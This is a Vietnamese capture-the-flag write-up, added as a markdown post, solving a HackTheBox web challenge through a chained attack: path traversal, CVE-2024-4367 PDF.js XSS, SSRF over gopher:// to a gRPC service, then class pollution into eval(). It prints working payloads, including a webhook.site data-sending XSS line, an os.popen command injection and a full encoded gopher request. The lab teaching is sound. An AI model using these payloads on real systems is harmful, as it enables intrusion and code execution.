@@ -1,0 +1,412 @@
+---
+title: "ArtificialUniversity"
+date: 2026-04-23
+platform: "HackTheBox"
+category: "Web"
+difficulty: "Medium"
+tags: ["web", "hackthebox"]
+draft: false
+---
+
+# ArtificialUniversity
+## Challenge Information
+- **Category**: Web Exploitation
+- **Event**: none
+- **Author**: 0x3dee & leanthedev
+- **Difficulty**: Insane
+- **URL**: https://app.hackthebox.com/challenges/ArtificialUniversity
+- **Tags**: #web #SSRF #Path_Traversal #CVE-2024-4367 #gRPC #XSS #Class_Pollution
+---
+## 1. Description
+>A group of known scammers are using a decoy dropshipping course site for cloaking payments from their other fraudulent sites. As you browse through it to look for more details you notice a small programming bug, that could lead to way bigger impact than initially expected. Keep looking for more vulnurabilities and take this greasy operation down.
+## 2. Overview
+Một bài với exploit chain cực chặt chẽ và logic, đòi hỏi tỉ mỉ trong từng bước
+## 3. Reconnaissance
+Để làm một challenge web thì đầu tiên ta sẽ trải nghiệm các chức năng của nó trước. Tổng quan đây là một trang cung cấp khóa học với các chức năng cơ bản như login, register, checkout,...
+
+![](./images/Pasted%20image%2020260409000108.png)
+
+Để hiểu sâu và tìm các chức năng ẩn ta sẽ đọc source code mà challenge cung cấp luôn, dưới đây là source map:
+
+```text
+ArtificialUniversity//
+├── conf/
+│   └── supervisord.conf
+├── src/
+│   ├── product_api/                     
+│   │   ├── api.py
+│   │   ├── compile_proto.sh*
+│   │   ├── product_pb2_grpc.py
+│   │   ├── product_pb2.py
+│   │   ├── product.proto
+│   │   └── requirements.txt
+│   └── store/
+│       ├── application/
+│       │   ├── blueprints/
+│       │   │   └── routes.py
+│       │   ├── util/
+│       │   │   ├── grpc_utils/
+│       │   │   │   ├── grpc_helper.py
+│       │   │   │   ├── product_pb2_grpc.py
+│       │   │   │   └── product_pb2.py
+│       │   │   ├── bot.py
+│       │   │   ├── curl.py
+│       │   │   ├── database.py
+│       │   │   ├── payments.py
+│       │   │   └── pdf.py
+│       │   ├── app.py
+│       │   └── config.py
+│       ├── requirements.txt
+│       └── run.py
+├── build_docker.sh*
+├── Dockerfile
+├── entrypoint.sh
+└── flag.txt
+```
+
+Với file `flag.txt`, sau khi được deploy thì file này sẽ được đổi tên thành `flag{random}.txt` để không LFI một cách đơn giản để lấy flag được:
+
+![](./images/Pasted%20image%2020260409021346.png)
+
+Xem qua file `Dockerfile` thì ta có thể thấy ứng dụng install một số phần mềm bên ngoài, mà trong số đó có một version **Firefox** rất đặc biệt là `125.0.1`, version này được công bố dính 1 CVE liên quan đến PDF.js vào năm 2024, cụ thể là **CVE-2024-4367**. (đến đây mình chỉ biết là nó dính CVE chứ vẫn chưa biết làm gì tiếp theo hẹ hẹ).
+
+![](./images/Pasted%20image%2020260409024215.png)
+
+Để hiểu rõ hơn về luồng hoạt động của web, ta sẽ kiểm tra tiếp các routes trong file `routes.py` xem có gì, đọc qua các file ta có thể tổng hợp thành như sau:
+
+Phía người dùng:
+- `/`, `/login`, `/register`, `/logout`: Các chức năng xác thực cơ bản của ứng dụng
+- `/product/<product_id>`: Truy suất sản phẩm theo `<product_id>`
+- `/subs`: Xem đơn đặt hàng của user
+- `/checkout`, `/checkout/success`: luồng tạo, xử lý và xác thực thanh toán cho user
+
+Phía Admin:
+- `/admin/user`, `/admin/products`, `/admin/order`: Xem danh sách user, sản phẩm, đơn đặt hàng
+- `/admin/view-pdf`: Xem tệp PDF
+- `/admin/api-health`: Check trạng thái API
+- `/admin/save-product`, `/admin/saved-products`: Lưu và xem các sản phẩm đã lưu
+
+Sau khi hiểu về các chức năng cơ bản thì ta bắt đầu phân tích sâu vào từng phần để tìm ra những nơi nhạy cảm có thể xuất hiện lỗ hổng.
+
+Đầu tiên mình có kiểm tra xem các routes với tính năng của `admin` thì thấy tất cả đều kiểm tra xác thực trước:
+
+```python
+if not session.get("loggedin") or session.get("role") != "admin":
+	return redirect("/")
+```
+
+Mình đã tạo tài khoản sau đó đăng nhập và lấy session dạng JWT đi decode thì dễ dàng thấy có trường `role` có giá trị là user:
+
+![](./images/Pasted%20image%2020260409082123.png)
+
+![](./images/Screenshot%202026-04-08%20005456.png)
+
+Nhưng vì JWT code này có một secret key nên không dễ dàng thay đổi `role` thành `admin` để bypass được. Mình đã thử xem file `config.py` có chứa email và password của admin nhưng pass là một mã random 32 bytes nên brute force là điều rất khó -> Ta phải tìm một hướng khác
+
+![](./images/Pasted%20image%2020260411230121.png)
+
+Phân tích `/checkout`:
+
+![](./images/Pasted%20image%2020260409085453.png)
+
+Phần đặc biệt:
+
+![](./images/Pasted%20image%2020260409090301.png)
+
+Phân tích tiếp `/checkout/success`:
+
+![](./images/Pasted%20image%2020260410110604.png)
+
+Phân tích sâu vào các hàm thì mình thấy logic các hàm như `get_amout_paid(payment_id)`, `bot_runner()` khá bất thường:
+
+![](./images/Pasted%20image%2020260410110816.png)
+
+-> `amt_paid` luôn có giá trị là 0
+
+![](./images/Pasted%20image%2020260410111140.png)
+
+Tham số `payment_id` lấy từ input của người dùng nhưng lại không có biện pháp nào để làm sạch -> Nghĩ ngay đến **Path Traversal**. 
+
+Ta có thể dùng các chuỗi `../` để **Path Traversal** và dùng ký tự `#` (url encode thành `%23`) để bypass được ký tự path `.pdf`.
+
+Cụ thể, nếu ta truyền tham số `payment_id=../../../../admin/{anything}#` vào hàm thì bot sẽ sử dụng trình duyệt Firefox để truy cập vào đường dẫn `http://127.0.0.1:1337/static/invoices/invoice_../../../../admin/{anything}#.pdf`, lúc này trình duyệt sẽ cắt bớt đoạn phía sau dấu `#` và rút đường dẫn thành `http://127.0.0.1:1337/admin/{anything}` -> ta có thể truy cập vào giao diện của admin.
+
+Tuy nhiên để gọi được bot thì lại có một điều kiện khắc khe là `amt_paid >= order.price` (`amt_paid` đã luôn = 0) và phải có `order_id` tồn tại để gửi request đến `/checkout/success`. Lúc này ta sẽ cần đến `/checkout` để bypass, bằng việc thêm vào một đơn hàng có giá trị âm thông qua `price` mà ta có thể tùy ý thao túng. Mình sẽ thử luôn:
+
+1. Đăng nhập để lấy session sau đó JWT decode để lấy `user_id`:
+
+	![](./images/Pasted%20image%2020260410112759.png)
+
+2. Dùng burp để gửi request GET đến `/checkout?price=-1&title=haha&user_id=2&email=1`:
+
+	![](./images/Pasted%20image%2020260410113001.png)
+
+3. Vào `/subs` để kiểm tra đã có đơn hàng chưa à lấy order_id:
+
+	![](./images/Pasted%20image%2020260410113218.png)
+
+-> Đã thêm đơn hàng giá âm thành công và lấy được `order_id` -> đủ điều kiện để dùng `/checkout/success` và gọi bot.
+
+Trong hàm `bot_runner()` thì bot lại sử dụng chính cái trình duyệt Firefox bị dính lỗ hổng CVE liên quan đến PDF -> rất có khả năng đây là các mảnh ghép để khai thác.
+
+Kết hợp cả `/checkout` và `/checkout/success` ta sẽ có chuỗi khai thác từ **Path Traversal** -> **SSRF**.
+
+Kiểm tra `/admin/view-pdf`:
+
+![697](./images/Pasted%20image%2020260410185449.png)
+
+Và tất nhiên ta cũng có thể sử dụng chức năng này của admin bằng cách bypass Path Traversal. Để kiểm định cho các giả thuyết trên thì mình cũng đã dùng **ngrok** để dựng một đường dẫn tạm thời để bot truy cập và đọc file:
+
+Mở cổng 8000:
+
+```bash
+python3 -m http.server 8000
+```
+
+Đào tunnel từ internet về cổng 8000 bằng **ngrok**:
+
+```bash
+ngrok http 8000
+```
+
+![](./images/Pasted%20image%2020260410213321.png)
+
+Truy cập thử vào file `test.pdf` bằng `/checkout/success?order_id=1&payment_id=../../../../admin/view-pdf?url=https://cursively-unmindful-elodia.ngrok-free.dev`
+
+![](./images/Pasted%20image%2020260410214209.png)
+
+HTTP request của **ngrok**:
+
+![](./images/Pasted%20image%2020260410214305.png)
+
+-> Giả thuyết đã chuẩn xác. Nhưng ta sẽ tận dụng thêm lỗ hổng CVE-2024-4367 của Firefox để test XSS luôn:
+Link PoC: https://github.com/LOURC0D3/CVE-2024-4367-PoC/blob/main/CVE-2024-4367.py
+
+Chạy script để build 1 file pdf chứa script buộc bot phải gửi request đến webhook của mình:
+
+```bash
+python CVE-2024-4367.py "new Image().src='https://https://webhook.site/3a5ad22e-c930-43f3-ad38-396fc1585ca4/?d='+encodeURIComponent(document.domain)"
+```
+
+Kết quả webhook:
+
+![](./images/Pasted%20image%2020260411235145.png)
+
+-> Coi như đã thành công một chút. Đến lúc này mình nghĩ sẽ tạo 1 cái bẫy **XSS** nào đó để bắt bot đọc flag và đưa cho ta. Nhưng làm sao và làm như thế nào thì lúc này mình vẫn chưa nghĩ ra được vì flag.txt không nằm trong cookie hay giao diện của admin, nên mình đành đọc source code tiếp để tìm các ý tưởng mới vậy.
+
+Kiểm tra `/admin/api-health` (route duy nhất có POST của admin):
+
+![](./images/Pasted%20image%2020260410230730.png)
+
+Kiểm tra tiếp hàm `get_url_status_code()` của route trên:
+
+![](./images/Pasted%20image%2020260411013026.png)
+
+Tác giả đã cố chặn con đường OS commend injection bằng cách truyền vào `subprocess.run` một array thay vì nối string (tương đương như `shell=False`). Tuy nhiên lệnh `curl` lại giúp ta có thể nhờ server gửi request đi bất kỳ đâu, nhưng để lấy flag thì gửi vào đâu vẫn chưa biết. Đến đây mình cũng đã khá là nản =)) Thôi cứ đọc source tiếp xem sao.
+
+Chuyển sang đọc thử phần `/product_api`:
+
+![264](./images/Pasted%20image%2020260411021804.png)
+
+Ta dễ dàng nhận thấy server dùng 1 dịch vụ Microservice chạy gRPC viết bằng Python. Nghĩa là server chính (Flask) sẽ gọi đến Microservice (gRPC) để xử lý các chức năng khác. Lúc này ta thử phân tích sâu hơn dịch vụ gRPC này.
+
+Kiểm tra `api.py` ta biết được rằng dịch vụ này được chạy ở cổng `50051` nội bộ:
+
+![](./images/Pasted%20image%2020260411022459.png)
+
+Trong file này hàm `GenerateProduct()` chịu trách nhiệm tạo dữ liệu cho sản phẩm. Nhưng nó lại sử dụng 1 hàm rất nguy hiểm là `eval()` và ném thẳng tham số `price_formula` vào mà không hề có 1 biện pháp làm sạch nào:
+
+![](./images/Pasted%20image%2020260411180312.png)
+
+Vậy nếu ta tìm cách để hàm này hoạt động ở nhánh `if` thì sẽ kích hoạt được `eval()`, để làm được điều này ta cần phải khiến có Object tồn tại thuộc tính `price_formula` từ trước. Và hàm này lại bị gọi bởi `GetNewProducts()`:
+
+![](./images/Pasted%20image%2020260412001405.png)
+
+-> Từ đây ta có cơ sở để truy ngược về các hàm khác để xem thử có thể cấu trúc lại Object hay đơn giản hơn là thêm thuộc tính `price_formula` vào Object được hay không.
+
+Kiểm tra hàm `DebugService()`, đây là hàm API duy nhất cho phép người dùng gửi lên cấu trúc dữ liệu dạng Key-Value tùy ý, sau đó nó sẽ gọi đến `UpdateService()`:
+
+![](./images/Pasted%20image%2020260411184132.png)
+
+Kiểm tra hàm `UpdateService()`, Hàm này sử dụng đệ quy để chèn các cặp Key-Value từ `source` vào `destination`:
+
+![](./images/Pasted%20image%2020260411185244.png)
+
+Hàm này lại sử dụng hàm `__dict__` để gán giá trị thuộc tính mà không có bất kỳ biện pháp làm sạch nào -> Lúc này ta có thể thêm một cặp thuộc tính - giá trị bất kỳ mà không có sự cản trở nào từ phía server -> Lỗ hổng **Class Pollution**.
+
+Liên hệ với các hàm API trên với nhau ta có một chuỗi khai thác gồm 2 bước như sau:
+- Gửi payload qua `DebugService()` để ép hàm `UpdateService()` chèn thuộc tính `price_formula` với giá trị là một mã độc và thẳng object.
+
+- Sau đó gửi tiếp request đến `GetNewProducts()` để gọi đến `GenerateProduct()`, ép server kích hoạt nhánh `if` của hàm, đưa thẳng mã độc vào `eval()` để RCE.
+
+Ta đã nắm trong tay được lỗ hổng **SSRF** thông qua `curl` ở endpoint `/admin/api-health` ở phần trước. Đến đây ta lại nắm thêm được một dịch vụ Microservice gRPC dính lỗ hổng **Class Pollution** chạy ở cổng `50051` 
+-> Ta sẽ tận dụng **SSRF** để `curl` tới dịch vụ gRPC này và gửi payload để trigger lỗ hổng **Class Pollution**.
+
+Tuy nhiên, nếu chúng ta chỉ đơn thuần dùng SSRF để gửi một request HTTP bình thường thì sẽ thất bại thảm hại. Theo như mình tìm hiểu và đã hỏi AI vì sao HTTP lại thất bại thì đó là do sự **bất đồng ngôn ngữ (Protocol Clash)**, trích Gemini:
+
+- `curl` với giao thức `http://` sẽ tự động nhét thêm một đống HTTP Headers dạng text (như `GET / HTTP/1.1`, `Host: ...`, `User-Agent: ...`) vào gói tin.
+
+- Trong khi đó, **gRPC** là một framework cực kỳ khắt khe. Nó giao tiếp trên nền tảng **HTTP/2** và sử dụng định dạng dữ liệu nhị phân **Protobuf**.
+
+Khi gRPC Server nhận được mớ text lộn xộn từ HTTP/1.1 của `curl`, nó sẽ coi đó là "rác" và thẳng tay ngắt kết nối trước khi mã độc của chúng ta kịp chạm tới hàm `DebugService`.
+
+Vậy thì làm sao để gửi đi một dữ liệu dạng thô thuần túy mà không chứa các Header nào từ HTTP???
+Theo như mình tìm hiểu thì một giao thức có tên **gopher** có một đặc tính rất chí mạng là nó cho phép gửi đi dữ liệu dạng raw TCP. Điều này lại khiến cho `gopher://` là lựa chọn phù hợp và xứng đáng nhất để mình lựa chọn cho nhiệm vụ này. Và cũng thật may mắn là **gopher** nằm trong danh sách các giao thức được hỗ trợ bởi `curl`. Để tìm hiểu kỹ hơn thì mình có đọc một bài viết khá hay tại [ĐÂY](https://nhienit.wordpress.com/2020/10/20/exploit-ssrf-voi-gopher-protocol/).
+## 4. Exploitation
+Dựa vào những gì recon được ở phần trên, ta có exploit chain như sau:
+
+Path Traversal --> XSS --> SSRF --> Pollution Class
+
+Ta sẽ bắt đầu từ việc tạo ra một gói tin nhị phân gRPC để gửi đến dịch vụ gRPC của server, nhưng để viết một gói tin nhị phân chính xác đến từng byte bằng tay là một điều không thể. Sau một lúc research thì mình đã tìm được **wireshark**, công cụ này sẽ giúp ta thực hiện điều đó một cách chính xác nhất (trước đây mình chưa từng dùng huhu). [LINK](https://www.wireshark.org/download.html)
+
+Để lấy được gói tin ta sẽ mô phỏng lại quá trình server Flask gọi API đến gRPC bằng cách chạy file `api.py` và chạy một script python để gửi request đến API, sau đó dùng **wireshark** để bắt và copy gói tin. Script gửi request như sau:
+
+```python
+import grpc
+import product_pb2
+import product_pb2_grpc
+
+channel = grpc.insecure_channel('127.0.0.1:50051')
+stub = product_pb2_grpc.ProductServiceStub(channel)
+
+payload = {
+    "price_formula": "__import__('os').popen('cp /flag*.txt /app/store/application/static/flag.txt').read() or 1.0"
+}
+
+request = product_pb2.DebugRequest(input=payload)
+stub.DebugService(request)
+
+stub.GetNewProducts(product_pb2.Empty())
+```
+
+Script này sẽ thêm thuộc tính `price_formula` với một đoạn lệnh buộc server phải copy flag ra /static/flag.txt (* là để bypass được ký tự ngẫu nhiên của file flag như lúc đầu mình đã nói).
+
+Chạy `api.py` và gửi request:
+
+![](./images/Pasted%20image%2020260411230741.png)
+
+Mở wireshark và lắng nghe cổng `Loopback:lo`:
+
+![](./images/Pasted%20image%2020260411230959.png)
+
+Right click -> Follow -> TCP Stream. Chọn chiều đến cổng 50051 và Show as chọn Raw:
+
+![](./images/Pasted%20image%2020260411231210.png)
+
+Bây giờ ta chỉ cần copy cái đoạn Raw và viết script để tạo một đường link `gopher://` :
+
+```python
+import binascii
+
+def hex_to_gopher_full(hex_str: str) -> str:
+
+    cleaned = hex_str.replace(" ", "").replace("\n", "").strip()
+    
+    if len(cleaned) % 2 != 0:
+        raise ValueError("Độ dài Hex không hợp lệ")
+        
+    binary = binascii.unhexlify(cleaned)
+    
+    encoded = "".join(f"%{b:02X}" for b in binary)
+    
+    return f"gopher://127.0.0.1:50051/_{encoded}"
+
+raw_hex = """505249202a20485454502f322e300d0a0d0a534d0d0a0d0a000024040000000000000200000000000300000000000400400000000500400000000600004000fe0300000001000004080000000000003f0001
+000000040100000000
+0000e101040000000140053a70617468242f70726f647563742e50726f64756374536572766963652f446562756753657276696365400a3a617574686f726974790f3132372e302e302e313a35303035318386400c636f6e74656e742d74797065106170706c69636174696f6e2f677270634002746508747261696c6572734014677270632d6163636570742d656e636f64696e67176964656e746974792c206465666c6174652c20677a6970400a757365722d6167656e7430677270632d707974686f6e2f312e38302e3020677270632d632f35332e302e3020286c696e75783b206368747470322900000408000000000100000005000005000100000001000000000000000408000000000000000005
+000008060100000000348ddd0b47372de2
+000008060000000000af345b83179262d3
+00003501040000000340053a70617468262f70726f647563742e50726f64756374536572766963652f4765744e657750726f6475637473c38386c2c1c0bf00000408000000000300000005000005000100000003000000000000000408000000000000000005"""
+
+print(hex_to_gopher_full(raw_hex))
+```
+
+Kết quả:
+
+```
+gopher://127.0.0.1:50051/_%50%52%49%20%2A%20%48%54%54%50%2F%32%2E%30%0D%0A%0D%0A%53%4D%0D%0A%0D%0A%00%00%24%04%00%00%00%00%00%00%02%00%00%00%00%00%03%00%00%00%00%00%04%00%40%00%00%00%05%00%40%00%00%00%06%00%00%40%00%FE%03%00%00%00%01%00%00%04%08%00%00%00%00%00%00%3F%00%01%00%00%00%04%01%00%00%00%00%00%00%E1%01%04%00%00%00%01%40%05%3A%70%61%74%68%24%2F%70%72%6F%64%75%63%74%2E%50%72%6F%64%75%63%74%53%65%72%76%69%63%65%2F%44%65%62%75%67%53%65%72%76%69%63%65%40%0A%3A%61%75%74%68%6F%72%69%74%79%0F%31%32%37%2E%30%2E%30%2E%31%3A%35%30%30%35%31%83%86%40%0C%63%6F%6E%74%65%6E%74%2D%74%79%70%65%10%61%70%70%6C%69%63%61%74%69%6F%6E%2F%67%72%70%63%40%02%74%65%08%74%72%61%69%6C%65%72%73%40%14%67%72%70%63%2D%61%63%63%65%70%74%2D%65%6E%63%6F%64%69%6E%67%17%69%64%65%6E%74%69%74%79%2C%20%64%65%66%6C%61%74%65%2C%20%67%7A%69%70%40%0A%75%73%65%72%2D%61%67%65%6E%74%30%67%72%70%63%2D%70%79%74%68%6F%6E%2F%31%2E%38%30%2E%30%20%67%72%70%63%2D%63%2F%35%33%2E%30%2E%30%20%28%6C%69%6E%75%78%3B%20%63%68%74%74%70%32%29%00%00%04%08%00%00%00%00%01%00%00%00%05%00%00%74%00%01%00%00%00%01%00%00%00%00%6F%0A%6D%0A%0D%70%72%69%63%65%5F%66%6F%72%6D%75%6C%61%12%5C%0A%5A%5F%5F%69%6D%70%6F%72%74%5F%5F%28%27%6F%73%27%29%2E%70%6F%70%65%6E%28%27%63%70%20%2F%66%6C%61%67%2A%2E%74%78%74%20%2E%2E%2F%73%74%6F%72%65%2F%61%70%70%6C%69%63%61%74%69%6F%6E%2F%73%74%61%74%69%63%2F%66%6C%61%67%2E%74%78%74%27%29%2E%72%65%61%64%28%29%20%6F%72%20%31%2E%30%00%00%04%08%00%00%00%00%00%00%00%00%05%00%00%08%06%01%00%00%00%00%D1%EC%09%A0%0A%22%5F%64%00%00%08%06%00%00%00%00%00%68%31%9C%96%22%60%1E%D0%00%00%35%01%04%00%00%00%03%40%05%3A%70%61%74%68%26%2F%70%72%6F%64%75%63%74%2E%50%72%6F%64%75%63%74%53%65%72%76%69%63%65%2F%47%65%74%4E%65%77%50%72%6F%64%75%63%74%73%C3%83%86%C2%C1%C0%BF%00%00%04%08%00%00%00%00%03%00%00%00%05%00%00%05%00%01%00%00%00%03%00%00%00%00%00%00%00%04%08%00%00%00%00%00%00%00%00%05
+```
+
+Mình đã cải tiến script gen payload một chút để thuận tiện cho việc lấy link, cụ thể hàm main mới là:
+
+```python
+if __name__ == "__main__":
+    print("[*] Đang đúc file PDF chứa mã XSS -> SSRF (Gopher via Form Submit)...")
+    
+    gopher_url = "COPY LINK TRÊN VÀO" 
+    
+    js_payload = (
+        "var f = document.createElement('form');"
+        "f.action = 'http://127.0.0.1:1337/admin/api-health';"
+        "f.method = 'POST';"
+        "var i = document.createElement('input');"
+        "i.name = 'url';"
+        f"i.value = '{gopher_url}';"
+        "f.appendChild(i);"
+        "document.body.appendChild(f);"
+        "f.submit();"
+    )
+    
+    payload_data = generate_payload(js_payload)
+    
+    with open("poc.pdf", "w") as f:
+        f.write(payload_data)
+
+    print("[+] Đã đúc thành công file: poc.pdf")
+```
+
+Script JS này sẽ tạo một cái form chưa url gopher và gửi đến url nội bộ `http://127.0.0.1:1337/admin/api-health`:
+
+![](./images/Pasted%20image%2020260411231738.png)
+
+Bây giờ chỉ việc đào tunnel ngrok để bắt bot truy cập vào poc.pdf. Sau đó bật Burp để thực hiện thao tác tương tự như lúc đầu đề cập:
+
+`/checkout?price=-1&title=haha&user_id=2&email=1`
+
+![](./images/Pasted%20image%2020260411233221.png)
+
+Lấy `order_id` và GET `/checkout/success?order_id=1&payment_id=../../../../admin/view-pdf?url=https://cursively-unmindful-elodia.ngrok-free.dev/poc.pdf%23`
+
+![](./images/Pasted%20image%2020260411232935.png)
+
+NỔ RỒI CÁC CHÁU ƠI!!!
+
+![](./images/Pasted%20image%2020260411232832.png)
+
+BÙM!!
+
+![](./images/Pasted%20image%2020260411233120.png)
+
+# 5. Summary
+
+```
+[Attacker] 
+   │ (Gửi link file poc.pdf)
+   ▼
+[Flask Route: /checkout/success]  ──(Ép tải file)──>  [Flask Route: /admin/view-pdf]
+                                                               │
+   ┌───────────────────────────────────────────────────────────┘
+   ▼
+[Trình duyệt Bot Admin (PDF.js)] 
+   │ ── Lỗ hổng XSS kích hoạt
+   │ ── JS tạo HTML Form (Gopher URL)
+   │ ── Submit (Bypass CORS)
+   ▼
+[Flask Route: /admin/api-health]
+   │ ── Đưa URL vào subprocess.run()
+   ▼
+[OS Command: curl]
+   │ ── Dịch Gopher -> TCP (Protocol Smuggling)
+   ▼
+[gRPC Service: 127.0.0.1:50051]
+   │ ── Payload 1 (DebugService): Gây ra Class Pollution (Cấy price_formula)
+   │ ── Payload 2 (GetNewProducts): Đánh thức nhánh if
+   ▼
+[Python eval() function] 
+   │ ── Lệnh hệ điều hành thực thi!
+   ▼
+[Thư mục /static/flag.txt] ──(Tải về)──> Submit flag
+```
+
+>h@ppy h@ck!n9 
+>*(BKSEC)*
